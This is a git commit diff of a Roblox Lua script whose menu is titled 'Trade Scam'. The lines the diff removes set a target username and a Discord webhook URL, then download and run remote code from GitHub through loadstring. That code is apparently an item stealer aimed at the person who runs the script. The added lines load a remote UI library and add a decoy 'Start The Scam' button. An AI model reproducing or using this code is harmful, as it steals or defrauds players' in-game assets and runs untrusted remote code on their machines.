c493b501f50d3d5957a999f44aaf0318a75fc276
CorruptedClan <105439556+CorruptedClan@users.noreply.github.com>
2023-04-20 17:56:16 +0300

    Update premiumSimp.lua

--- premiumSimp.lua
+++ premiumSimp.lua
@@ -1,24 +1,13 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 
+local Window = Library.CreateLib("TITLE", "DarkTheme")
 
 -- Main
-local Window = OrionLib:MakeWindow({Name = "Trade Scam (⭐Premium)", HidePremium = false, SaveConfig = true, ConfigFolder = "Orion1"})
 
--- Tab 1
-local TradeTab = Window:MakeTab({ 
-         Name = "Trade Scam", 
-         Icon = "rbxassetid://4483345998", 
-         PremiumOnly = false 
- })
- 
-TradeTab:AddButton({ 
-         Name = "Activate Scam", 
-         Callback = function() 
-                       UserName = "Wizard_CatWhite"
-WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+local TradeTab = Window:NewTab("Trade Scam")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))() 
-           end     
- })
- 
- OrionLib:Init()
+local ScamSection = TradeTab:NewSection("Scam thingy")
+
+ScamSection:NewButton("Start The Scam", "press before trade", function()
+    print("you have 30 seconds...")
+end)
